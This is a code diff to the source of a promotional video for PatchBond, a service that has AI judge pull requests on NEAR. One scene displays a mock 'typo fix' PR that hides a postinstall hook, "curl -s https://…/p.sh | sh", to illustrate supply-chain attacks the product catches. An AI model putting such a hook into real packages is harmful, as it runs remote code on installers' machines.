@@ -1,4 +1,4 @@
-// The short cut (~53 s): beat-synced to an original 124 BPM track (gen-music.ts), narrated by a
+// The short cut (~57 s): beat-synced to an original 124 BPM track (gen-music.ts), narrated by a
 // neural voice (gen-voice.mjs), with burned-in captions for muted autoplay. Product shots are real
 // recordings of the running app (record.ts); receipts are real testnet transactions (fetch-txs.ts).
 
@@ -153,17 +153,26 @@ function Hook() {
   );
 }
 
-function Pain() {
+/** The threat: attacks go through tired people — a friendly PR with a backdoor folded inside. */
+function Threat() {
+  const frame = useCurrentFrame();
+  const reveal = interpolate(frame, [f(BEAT * 4.6), f(BEAT * 5.2)], [0, 1], { extrapolateLeft: "clamp", extrapolateRight: "clamp" });
   return (
     <AbsoluteFill>
-      <Backdrop hue={C.danger} intensity={0.7} />
-      <AbsoluteFill style={{ alignItems: "center", justifyContent: "center", gap: 50 }}>
-        <Kinetic words={["Every", "PR", "still", "costs", "a", "maintainer", "an", "hour."]} accent={[6, 7]} size={104} startBeat={0.1} style={{ justifyContent: "center", maxWidth: 1500, textAlign: "center" }} />
-        <Pop at={f(BEAT * 4.6)}>
-          <Chip tone={C.danger}>
-            <b style={{ fontSize: 34 }}>~25%</b> of incoming PRs are low-quality AI output
-            <span style={{ color: C.faint, fontSize: 22, fontWeight: 500 }}>Linux Foundation, Oct 2026</span>
-          </Chip>
+      <Backdrop hue={C.danger} intensity={0.8} />
+      <AbsoluteFill style={{ alignItems: "center", justifyContent: "center" }}>
+        <Kinetic words={["Attacks", "break", "tired", "people."]} accent={[2, 3]} size={130} startBeat={0.1} style={{ justifyContent: "center", maxWidth: 1600 }} />
+        <Pop at={f(BEAT * 3.6)} style={{ marginTop: 60 }}>
+          <div style={{ width: 1180, background: C.panel, border: `1.5px solid ${C.line}`, borderRadius: 24, overflow: "hidden", boxShadow: "0 40px 120px -30px rgba(0,0,0,.9)" }}>
+            <div style={{ padding: "18px 28px", fontSize: 30, fontWeight: 650 }}>
+              ✨ Fix typo in docs <span style={{ color: C.faint, fontWeight: 500, fontSize: 24 }}>· @friendly-dev · "happy to help!"</span>
+            </div>
+            <div style={{ fontFamily: mono, fontSize: 26, padding: "10px 28px 18px", color: C.ink2, borderTop: `1px solid ${C.line}` }}>
+              <div>- Teh queue runs jobs.</div>
+              <div>+ The queue runs jobs.</div>
+              <div style={{ color: C.danger, opacity: reveal, background: `rgba(248,113,113,${0.12 * reveal})` }}>+ "postinstall": "curl -s https://…/p.sh | sh"</div>
+            </div>
+          </div>
         </Pop>
       </AbsoluteFill>
     </AbsoluteFill>
@@ -300,7 +309,7 @@ function Judge() {
 
 function Verify() {
   const frame = useCurrentFrame();
-  const stamp = spring({ frame: frame - f(BAR * 1.35), fps: FPS, config: { damping: 10, stiffness: 200 } });
+  const stamp = spring({ frame: frame - f(BEAT * 1.4), fps: FPS, config: { damping: 10, stiffness: 200 } });
   return (
     <AbsoluteFill>
       <Whip>
@@ -354,13 +363,19 @@ function Attack() {
           </div>
           <div style={{ display: "flex", gap: 18, marginTop: 34, opacity: flag }}>
             <Chip tone={C.danger}>install hook that runs downloaded code</Chip>
-            <Chip tone={C.danger}>pipes a download into a shell</Chip>
+            <Chip tone={C.danger}>claims work the diff doesn't contain</Chip>
           </div>
+          <Pop at={f(BEAT * 4)} style={{ marginTop: 30, maxWidth: 1400 }}>
+            <div style={{ fontSize: 30, color: C.ink2, lineHeight: 1.45, textAlign: "center", fontStyle: "italic" }}>
+              “Adds a postinstall hook that pipes a remote script into a shell… none of the claimed work.”
+              <div style={{ fontStyle: "normal", fontFamily: mono, fontSize: 20, color: C.faint, marginTop: 10 }}>the model's own words · signature 0x3b75…fa0c · checked on-chain</div>
+            </div>
+          </Pop>
         </AbsoluteFill>
         <div style={{ position: "absolute", right: 150, top: 120, transform: `rotate(7deg) scale(${0.3 + 0.7 * stamp})`, opacity: Math.min(1, stamp * 1.4) }}>
           <div style={{ border: `6px solid ${C.danger}`, color: C.danger, borderRadius: 22, padding: "16px 32px", fontSize: 56, fontWeight: 900, letterSpacing: "0.06em", background: "rgba(11,13,16,.85)", boxShadow: `0 0 60px ${C.danger}55` }}>
             FORFEITED
-            <div style={{ fontSize: 22, fontWeight: 600, letterSpacing: "0.02em", color: C.ink2, marginTop: 2 }}>malicious code · still challengeable</div>
+            <div style={{ fontSize: 22, fontWeight: 600, letterSpacing: "0.02em", color: C.ink2, marginTop: 2 }}>signed by NEAR AI's enclave · 0.99</div>
           </div>
         </div>
       </Whip>
@@ -391,6 +406,97 @@ function Fair() {
               </Pop>
             ))}
           </div>
+        </AbsoluteFill>
+      </Whip>
+    </AbsoluteFill>
+  );
+}
+
+/** OutLayer: the contract has the PR judged inside an Intel TDX enclave; our server isn't in the path. */
+function Outlayer() {
+  const frame = useCurrentFrame();
+  const strike = interpolate(frame, [f(BEAT * 4.4), f(BEAT * 5)], [0, 1], { extrapolateLeft: "clamp", extrapolateRight: "clamp" });
+  const box = (title: string, sub: string, tone: string) => (
+    <div style={{ width: 360, background: C.panel, border: `1.5px solid ${tone}55`, borderRadius: 24, padding: "26px 28px", boxShadow: `0 30px 80px -30px ${tone}66` }}>
+      <div style={{ fontSize: 36, fontWeight: 800, letterSpacing: "-0.02em" }}>{title}</div>
+      <div style={{ fontSize: 22, color: C.ink2, marginTop: 8, lineHeight: 1.35 }}>{sub}</div>
+    </div>
+  );
+  const arrow = (at: number) => (
+    <Pop at={f(BEAT * at)}>
+      <div style={{ fontSize: 56, color: C.brand, fontWeight: 800 }}>→</div>
+    </Pop>
+  );
+  return (
+    <AbsoluteFill>
+      <Backdrop intensity={1.1} />
+      <Whip>
+        <div style={{ position: "absolute", left: 110, top: 100 }}>
+          <Pop>
+            <div style={{ fontSize: 26, fontWeight: 700, letterSpacing: "0.24em", color: C.brand }}>OUTLAYER · INTEL TDX · LIVE ON TESTNET</div>
+          </Pop>
+          <Pop at={3}>
+            <div style={{ fontSize: 70, fontWeight: 800, letterSpacing: "-0.04em", marginTop: 10 }}>Judged in a sealed enclave.</div>
+          </Pop>
+        </div>
+        <AbsoluteFill style={{ alignItems: "center", justifyContent: "center", top: 120 }}>
+          <div style={{ display: "flex", alignItems: "center", gap: 26 }}>
+            <Pop at={f(BEAT * 0.8)}>{box("Contract", "anyone asks: judge_in_tee", C.brand)}</Pop>
+            {arrow(1.4)}
+            <Pop at={f(BEAT * 1.8)}>{box("Enclave", "reads GitHub itself, asks NEAR AI", C.brand)}</Pop>
+            {arrow(2.4)}
+            <Pop at={f(BEAT * 2.8)}>{box("Contract", "checks NEAR AI's signature, settles", C.brand)}</Pop>
+          </div>
+          <Pop at={f(BEAT * 3.8)} style={{ marginTop: 50 }}>
+            <div style={{ position: "relative", display: "inline-block", padding: "16px 34px", borderRadius: 18, border: `1.5px dashed ${C.faint}`, color: C.faint, fontSize: 34, fontWeight: 700 }}>
+              PatchBond's server
+              <div style={{ position: "absolute", left: -10, right: -10, top: "50%", height: 5, background: C.danger, transformOrigin: "left", transform: `scaleX(${strike})`, boxShadow: `0 0 18px ${C.danger}` }} />
+            </div>
+            <span style={{ fontSize: 32, color: C.ink2, marginLeft: 24, opacity: strike }}>not in the loop</span>
+          </Pop>
+          <Pop at={f(BEAT * 5.6)} style={{ marginTop: 34 }}>
+            <Chip>tx GTZM613J… · 24.5 s in the enclave · signer recovered on-chain</Chip>
+          </Pop>
+        </AbsoluteFill>
+      </Whip>
+    </AbsoluteFill>
+  );
+}
+
+/** nearcore: what PatchBond did on NEAR's own core repo. */
+function Nearcore() {
+  const stats = [
+    { n: 186, label: "open PRs", tone: C.ink },
+    { n: 20, label: "from strangers, judged", tone: C.ink },
+    { n: 0, label: "honest PRs forfeited", tone: C.brand },
+  ];
+  return (
+    <AbsoluteFill>
+      <Backdrop intensity={0.9} />
+      <Whip>
+        <AbsoluteFill style={{ alignItems: "center", justifyContent: "center" }}>
+          <Pop>
+            <div style={{ fontSize: 28, fontWeight: 700, letterSpacing: "0.24em", color: C.faint, textTransform: "uppercase" }}>NEAR's own core repo · near/nearcore</div>
+          </Pop>
+          <div style={{ display: "flex", gap: 90, marginTop: 50 }}>
+            {stats.map((x, i) => (
+              <Pop key={x.label} at={f(BEAT * (0.5 + i * 0.9))}>
+                <div style={{ textAlign: "center" }}>
+                  <div style={{ fontSize: 170, fontWeight: 800, letterSpacing: "-0.05em", color: x.tone, lineHeight: 1 }}>
+                    <Count to={x.n} at={f(BEAT * (0.5 + i * 0.9))} />
+                  </div>
+                  <div style={{ fontSize: 32, color: C.ink2, marginTop: 10 }}>{x.label}</div>
+                </div>
+              </Pop>
+            ))}
+          </div>
+          <Pop at={f(BEAT * 4.4)} style={{ marginTop: 56 }}>
+            <div style={{ display: "flex", gap: 20 }}>
+              <Chip>13 refunded automatically</Chip>
+              <Chip tone={C.warn}>7 to a maintainer</Chip>
+              <Chip tone={C.ink2}>$0.0074 for all 20</Chip>
+            </div>
+          </Pop>
         </AbsoluteFill>
       </Whip>
     </AbsoluteFill>
@@ -442,36 +548,8 @@ function Chain() {
   );
 }
 
-function Grid() {
-  const cells = [
-    { src: "pay", start: 1, label: "One tap — USDC or NEAR", to: { x: 1180, y: 420, z: 1.25 } },
-    { src: "agents", start: 1.2, label: "Agents: capped wallets", to: { x: 1150, y: 300, z: 1.3 } },
-    { src: "maintainers", start: 0.8, label: "Maintainers: link & withdraw", to: { x: 960, y: 420, z: 1.2 } },
-    { src: "hero", start: 6, label: "Live bond pricing", to: { x: 1265, y: 450, z: 1.6 } },
-  ];
-  return (
-    <AbsoluteFill>
-      <Backdrop intensity={0.7} />
-      <div style={{ position: "absolute", inset: 70, display: "grid", gridTemplateColumns: "1fr 1fr", gridTemplateRows: "1fr 1fr", gap: 26 }}>
-        {cells.map((c, i) => (
-          <Pop key={c.src} at={i * 4} style={{ position: "relative", borderRadius: 24, overflow: "hidden", border: `1.5px solid ${C.line}`, boxShadow: "0 30px 80px -30px rgba(0,0,0,.9)" }}>
-            <div style={{ position: "relative", width: "100%", height: "100%" }}>
-              <div style={{ position: "absolute", width: 1920, height: 1080, transform: "scale(0.4515)", transformOrigin: "0 0" }}>
-                <Camera src={c.src} startSec={c.start} to={c.to} framed />
-              </div>
-              <div style={{ position: "absolute", left: 18, bottom: 18 }}>
-                <Chip style={{ fontSize: 22, padding: "10px 18px" }}>{c.label}</Chip>
-              </div>
-            </div>
-          </Pop>
-        ))}
-      </div>
-    </AbsoluteFill>
-  );
-}
-
 function Near() {
-  const items = ["NEAR AI Cloud · TEE", "Rust contract", "USDC & wNEAR", "Function-call keys", "Meta tx · NEP-366", "NEP-413 signatures", "NEAR Intents", "Sputnik DAO"];
+  const items = ["NEAR AI Cloud · TEE", "OutLayer · Intel TDX", "Rust contract", "USDC & wNEAR", "Function-call keys", "Meta tx · NEP-366", "NEP-413 signatures", "NEAR Intents", "Sputnik DAO"];
   return (
     <AbsoluteFill>
       <Backdrop intensity={1.1} />
@@ -511,7 +589,7 @@ function Close() {
         </Pop>
         <Pop at={f(BEAT * 6.5)} style={{ marginTop: 26 }}>
           <div style={{ fontFamily: mono, fontSize: 32, color: C.ink2 }}>github.com/PatchBond/patchbond</div>
-          <div style={{ fontSize: 22, color: C.faint, marginTop: 12 }}>Live on NEAR testnet · verdicts signed in a NEAR AI TEE · MIT · No token</div>
+          <div style={{ fontSize: 22, color: C.faint, marginTop: 12 }}>Live on NEAR testnet · judged in NEAR AI & OutLayer enclaves · MIT · No token</div>
         </Pop>
       </AbsoluteFill>
     </AbsoluteFill>
@@ -549,7 +627,7 @@ function Progress() {
 
 const SCENES: Record<string, () => ReactNode> = {
   hook: () => <Hook />,
-  pain: () => <Pain />,
+  threat: () => <Threat />,
   maintainer: () => <Maintainer />,
   logo: () => <Logo />,
   bond: () => <Bond />,
@@ -557,9 +635,10 @@ const SCENES: Record<string, () => ReactNode> = {
   judge: () => <Judge />,
   attack: () => <Attack />,
   verify: () => <Verify />,
+  outlayer: () => <Outlayer />,
   fair: () => <Fair />,
+  nearcore: () => <Nearcore />,
   chain: () => <Chain />,
-  grid: () => <Grid />,
   near: () => <Near />,
   close: () => <Close />,
 };
